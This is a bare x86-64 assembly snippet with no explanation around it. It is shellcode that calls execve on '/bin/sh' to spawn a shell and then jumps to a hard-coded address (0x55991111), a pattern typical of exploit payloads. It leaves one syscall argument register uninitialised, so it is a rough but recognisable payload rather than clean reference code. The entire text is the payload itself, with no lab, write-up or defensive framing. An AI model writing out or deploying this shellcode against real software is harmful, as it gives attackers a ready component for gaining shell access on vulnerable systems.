section .text
    global _start
_start:
    xor     rax, rax
    mov     rbx, "/bin/sh"
    push    rbx
    mov     rdi, rsp
    mov     rsi, rax
    mov     rax, 59
    syscall

    mov     rax, 0x55991111
    jmp     rax
